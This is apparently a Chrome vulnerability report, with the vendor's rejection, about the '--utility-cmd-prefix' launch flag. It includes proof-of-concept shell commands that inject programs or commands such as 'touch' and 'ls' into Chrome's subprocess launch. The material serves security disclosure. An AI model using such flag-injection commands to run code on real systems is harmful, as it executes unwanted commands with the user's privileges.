<h3>The problem</h3>
<h4>Please describe the technical details of the vulnerability</h4>
<h2>Summary</h2>
<p>Chrome’s <code>--utility-cmd-prefix</code> flag enables <strong>arbitrary command execution</strong> outside the sandbox — without user interaction.</p>
<p>This debug-only flag allows prepending arbitrary binaries or shell commands to the execution of Chrome utility subprocesses (<code>Google Chrome Helper</code>, etc). Since it is available in <strong>production/stable builds</strong>, it directly violates Chrome&#39;s intended security boundaries and enables arbitrary command execution that can be used for <strong>persistence, sandbox escape chaining, and lateral movement</strong>.</p>
<h2>PoC 1 — Launch Calculator.app</h2>
<pre><code>/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
  <span class="stx-string">&quot;--utility-cmd-prefix=/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> \
  http://google.com &amp;
</code></pre>
<p>Result: Chrome spawns <code>Calculator.app</code>, proving arbitrary binary execution.</p>
<h2>PoC 2 — Arbitrary Shell Command Execution</h2>
<pre><code>/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
  <span class="stx-string">&quot;--utility-cmd-prefix=touch /tmp/crash_test&quot;</span> \
  http://google.com &amp;

<span class="stx-comment"># Wait and verify:</span>
sleep <span class="stx-number">3</span>
ls -la /tmp/crash_test <span class="stx-number">2</span>&gt;/dev/null
</code></pre>
<p>Result: The file <code>/tmp/crash_test</code> is created.</p>
<h2>PoC 3 - Launch Notes.app</h2>
<pre><code>/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome <span class="stx-string">&quot;--utility-cmd-prefix=/System/Applications/Notes.app/Contents/MacOS/Notes&quot;</span> http://google.com &amp;
</code></pre>
<p>Results: Chrome spawns <code>Notes</code>, proving arbitrary binary execution.</p>
<p><strong>Note:</strong> These pocs might not work when you try them multiple or for the second time. You will need to restart your Mac and try again.</p>
<h2>Why This Is a Security Issue</h2>
<ul>
<li>It allows <strong>pre-sandbox</strong> command execution</li>
<li>It enables arbitrary code execution</li>
</ul>
<p>This breaks Chrome&#39;s security boundary and trust model. An attacker with control over launch arguments (even without root) can exploit this to execute code outside the sandbox.</p>
<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
<ul>
<li>Arbitrary code execution as the current user</li>
<li>Execution is <strong>outside the Chrome sandbox</strong></li>
<li>Can be abused in:
<ul>
<li>MDM-managed environments</li>
<li>Misconfigured launch contexts (e.g. when Chrome is auto-launched by privileged apps)</li>
<li>Any scenario where attacker controls Chrome launch arguments</li>
</ul>
</li>
</ul>

* Chrome attempted to spawn a utility subprocess for something like networking or storage.
* Instead of launching the expected Chrome binary, it **ran**:

  ```bash
  ls -la /Library/Preferences/ --type=utility --utility-sub-type=network.mojom.NetworkService ...
  ```
* `ls` happily executed and dumped the contents of a **sensitive system directory**.
* Any unknown flag (`--type=utility`, etc.) is interpreted by `ls` as a filename → so `ls` created empty files with those names.

<p>Thank you for your report.</p>
<p>We have reviewed your submission regarding the <code>--utility-cmd-prefix</code> flag. The ability to pass command-line flags to Chrome is not considered a security boundary. These flags are intended features for developers and testers to debug and configure the browser.</p>
<p>An attacker who has the ability to launch Chrome with arbitrary flags (such as <code>--utility-cmd-prefix</code>) is already in a position to execute arbitrary code with the user&#39;s privileges, simply by executing the payload command directly. As such, this report falls under the category of <strong>physically-local attacks</strong>, which are outside of Chrome&#39;s threat model.</p>
<p>For more information, please refer to the &quot;Why aren&#39;t physically-local attacks in Chrome&#39;s threat model?&quot; section of the <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/docs/security/faq.md%23why-arent-physically_local-attacks-in-chromes-threat-model&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3DUL3-W8nSs6ja8E1P2Viz">Chrome Security FAQ</a>.</p>
